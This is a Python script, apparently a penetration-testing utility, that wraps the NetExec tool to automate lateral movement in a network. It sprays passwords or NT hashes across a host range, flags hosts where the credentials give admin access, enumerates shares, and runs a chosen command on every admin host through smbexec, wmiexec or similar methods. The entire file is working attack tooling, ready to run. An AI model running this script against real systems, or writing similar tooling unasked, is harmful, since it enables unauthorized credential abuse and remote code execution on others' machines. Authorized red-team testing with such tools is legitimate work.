#!/usr/bin/env python3
# For authorized penetration testing and educational environments only.
# Usage against targets without prior mutual written consent is illegal.
# It is the end user's responsibility to obey all applicable laws.
"""NetExec lateral-movement helper.

Wraps the `nxc` CLI to validate credentials across a host range, identify
admin (Pwn3d!) access, enumerate shares, and optionally run a command.
Parses NetExec stdout to produce a structured JSON report.
"""

import argparse
import json
import re
import shutil
import subprocess
import sys
from datetime import datetime, timezone

# NetExec marks admin code-exec hosts with (Pwn3d!) and successes with [+]
PWNED_RE = re.compile(r"^(?P<proto>\w+)\s+(?P<ip>[\d.]+)\s+\d+\s+(?P<host>\S+)\s+"
                      r"\[\+\]\s+(?P<cred>\S+)(?P<pwned>\s+\(Pwn3d!\))?", re.M)


def ensure_nxc():
    """Verify the nxc binary is on PATH."""
    if shutil.which("nxc") is None:
        sys.exit("[!] nxc not found. Install: pipx install "
                 "git+https://github.com/Pennyw0rth/NetExec")


def run_nxc(args_list, timeout=600):
    """Run an nxc command and return combined stdout/stderr text."""
    cmd = ["nxc"] + args_list
    print(f"[*] {' '.join(cmd)}")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return proc.stdout + proc.stderr
    except subprocess.TimeoutExpired:
        return "[!] nxc timed out"
    except FileNotFoundError:
        sys.exit("[!] nxc not found on PATH")


def parse_results(output):
    """Extract successful auths and admin (Pwn3d!) hosts from nxc output."""
    successes, pwned = [], []
    for m in PWNED_RE.finditer(output):
        rec = {"protocol": m.group("proto"), "ip": m.group("ip"),
               "host": m.group("host"), "cred": m.group("cred"),
               "admin": bool(m.group("pwned"))}
        successes.append(rec)
        if rec["admin"]:
            pwned.append(rec)
    return successes, pwned


def build_auth(args):
    """Build the auth portion of an nxc command."""
    auth = ["-u", args.user]
    if args.hash:
        auth += ["-H", args.hash]
    elif args.password:
        auth += ["-p", args.password]
    if args.domain:
        auth += ["-d", args.domain]
    if args.local_auth:
        auth += ["--local-auth"]
    return auth


def main():
    p = argparse.ArgumentParser(description="NetExec lateral-movement helper")
    p.add_argument("target", help="Target IP, CIDR, or hosts file")
    p.add_argument("-u", "--user", required=True, help="Username or users file")
    p.add_argument("-p", "--password", help="Password or passwords file")
    p.add_argument("-H", "--hash", help="NT hash or LM:NT for pass-the-hash")
    p.add_argument("-d", "--domain", help="AD domain")
    p.add_argument("--protocol", default="smb",
                   choices=["smb", "winrm", "ldap", "mssql", "ssh", "wmi", "rdp"])
    p.add_argument("--local-auth", action="store_true", help="Use local SAM auth")
    p.add_argument("--shares", action="store_true", help="Enumerate shares on hits")
    p.add_argument("--spray", action="store_true",
                   help="Add --continue-on-success for password spraying")
    p.add_argument("--exec", dest="exec_cmd", help="Command to run on Pwn3d! hosts")
    p.add_argument("--exec-method", choices=["smbexec", "wmiexec", "atexec", "mmcexec"])
    p.add_argument("--output", help="Write JSON report to file")
    args = p.parse_args()

    if not args.password and not args.hash:
        p.error("provide -p/--password or -H/--hash")

    ensure_nxc()
    report = {"generated": datetime.now(timezone.utc).isoformat(),
              "target": args.target, "protocol": args.protocol}

    # 1. Validate credentials
    cmd = [args.protocol, args.target] + build_auth(args)
    if args.spray:
        cmd.append("--continue-on-success")
    output = run_nxc(cmd)
    successes, pwned = parse_results(output)
    report["successful_auths"] = successes
    report["admin_hosts"] = pwned
    print(f"[+] {len(successes)} successful auth(s), {len(pwned)} with admin access")

    # 2. Optional share enumeration
    if args.shares and successes:
        sh = run_nxc([args.protocol, args.target] + build_auth(args) + ["--shares"])
        report["shares_raw"] = sh.strip().splitlines()[-50:]

    # 3. Optional command execution on admin hosts
    if args.exec_cmd and pwned:
        report["exec_results"] = {}
        for host in pwned:
            ex = [args.protocol, host["ip"]] + build_auth(args) + ["-x", args.exec_cmd]
            if args.exec_method:
                ex += ["--exec-method", args.exec_method]
            report["exec_results"][host["ip"]] = run_nxc(ex).strip().splitlines()[-20:]

    if args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2)
        print(f"[+] Report written to {args.output}")
    else:
        print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
